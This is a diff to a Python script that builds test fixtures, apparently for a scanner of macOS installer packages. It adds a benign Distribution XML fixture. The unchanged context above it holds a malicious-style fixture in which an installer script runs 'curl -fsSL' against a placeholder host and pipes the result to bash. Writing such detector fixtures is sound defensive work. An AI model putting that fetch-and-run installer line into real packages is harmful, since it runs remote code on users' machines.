@@ -63,6 +63,31 @@ def build():
         b'<a><script>system.run("/bin/bash", "-c", "curl -fsSL '
         b'https://example-cdn.invalid/a.sh | /bin/bash");</script></a>')
 
+    # The benign counterpart (the installer_distribution_js_ordinary fixture's).
+    add("distribution_ordinary", (
+        b'<?xml version="1.0" encoding="utf-8" standalone="yes"?>\n'
+        b'<installer-gui-script minSpecVersion="1">\n'
+        b'    <title>Example App</title>\n'
+        b'    <options customize="allow" rootVolumeOnly="true"/>\n'
+        b'    <script>\n'
+        b'    function onConclusion() {\n'
+        b"        system.run('unload.sh');\n"
+        b'    }\n'
+        b'    </script>\n'
+        b'    <choices-outline>\n'
+        b'        <line choice="default"/>\n'
+        b'    </choices-outline>\n'
+        b'    <choice id="default" title="Example App" selected="system.compareVersions(system.version.ProductVersion, \'10.9\') &lt; 1">\n'
+        b'        <pkg-ref id="invalid.example.navtest"/>\n'
+        b'    </choice>\n'
+        b'    <conclusion file="conclusion.html" onConclusionScript="onConclusion()"/>\n'
+        b'    <pkg-ref id="invalid.example.navtest" version="1" installKBytes="1" updateKBytes="0">#component.pkg</pkg-ref>\n'
+        b'    <pkg-ref id="invalid.example.navtest">\n'
+        b'        <bundle-version/>\n'
+        b'    </pkg-ref>\n'
+        b'</installer-gui-script>'
+    ))
+
     add("zeros_64k", b"\x00" * 65536)
 
     # ~250 KB of low-entropy bytes at level 1 -> 3 blocks.
